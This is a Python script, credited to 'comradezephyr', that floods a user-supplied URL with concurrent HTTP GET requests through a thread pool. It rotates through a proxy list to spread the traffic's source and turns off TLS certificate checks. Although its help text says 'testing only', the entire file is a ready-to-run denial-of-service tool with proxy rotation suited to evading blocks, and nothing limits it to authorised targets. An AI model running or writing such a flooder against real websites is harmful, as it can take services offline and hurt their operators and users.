import requests
import concurrent.futures
import time
import itertools
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = [ ]

def send_request(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(url, proxies=proxies, verify=False, timeout=10)
        return response.status_code
    except requests.RequestException as e:
        return f"Error: {e}"

def main(url, num_threads, num_requests):
    start_time = time.time()

    proxy_cycle = itertools.cycle(PROXIES) if PROXIES else itertools.cycle([None])

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for _ in range(num_requests):
            proxy = next(proxy_cycle)
            futures.append(executor.submit(send_request, url, proxy))

        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            status = future.result()
            print(f"Request {i}: Status {status}")

    elapsed = time.time() - start_time
    print(f"\nSent {num_requests} requests in {elapsed:.2f} seconds using {num_threads} threads.\n Developed by comradezephyr")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Fast HTTP request flooder using concuretnt threads. Developed for testing only. ALR- @comradezephyr")
    parser.add_argument("url", help="Target URL to send requests to")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("-n", "--requests", type=int, default=100, help="Total number of requests to send (default: 100)")

    args = parser.parse_args()

    main(args.url, args.threads, args.requests)
